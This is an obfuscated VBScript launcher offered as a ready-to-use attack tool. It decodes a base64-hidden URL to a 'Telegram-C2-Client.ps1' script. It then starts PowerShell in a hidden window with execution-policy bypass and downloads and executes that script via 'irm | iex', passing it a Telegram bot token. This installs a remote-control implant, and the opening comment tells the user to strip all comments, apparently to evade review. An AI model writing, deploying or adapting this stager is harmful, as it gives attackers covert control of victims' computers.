' Convert token to base64, place below and remmove ALL comments.

Set WshShell = CreateObject("WScript.Shell")
' TOKEN
enf = "TELEGRAM_TOKEN_BASE64_HERE"
' URL
msr = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2JlaWdld29ybS9Qb3NoR3JhbS1DMi9tYWluL1RlbGVncmFtLUMyLUNsaWVudC5wczE="
hda = rkv(enf)
iky = rkv(msr)
upd = "$tg='" & hda & "'; irm " & iky & " | iex"
WshShell.Run "powershell -NoP -NonI -Exec Bypass -C """ & upd & """", 0, True
Function rkv(base64)
    With CreateObject("MSXML2.DOMDocument").CreateElement("b64")
        .DataType = "bin.base64" : .Text = base64
        rkv = oeh(.NodeTypedValue)
    End With
End Function
Function oeh(arrBytes)
    With CreateObject("ADODB.Stream")
        .Type = 1 : .Open : .Write arrBytes : .Position = 0
        .Type = 2 : .Charset = "utf-8"
        oeh = .ReadText : .Close
    End With
End Function
